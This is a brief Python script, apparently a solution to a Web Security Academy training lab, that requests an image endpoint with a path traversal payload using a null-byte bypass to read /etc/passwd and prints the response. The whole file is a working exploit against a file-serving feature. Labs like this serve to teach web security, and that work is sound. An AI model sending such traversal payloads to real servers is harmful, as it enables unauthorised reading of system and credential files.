import requests

site = "0ab3005904cf7883813f02d900e500a6.web-security-academy.net"
url = f"https://{site}/image?filename=../../../etc/passwd%00.png"
s = requests.Session()
resp = s.get(url)
print(resp.text)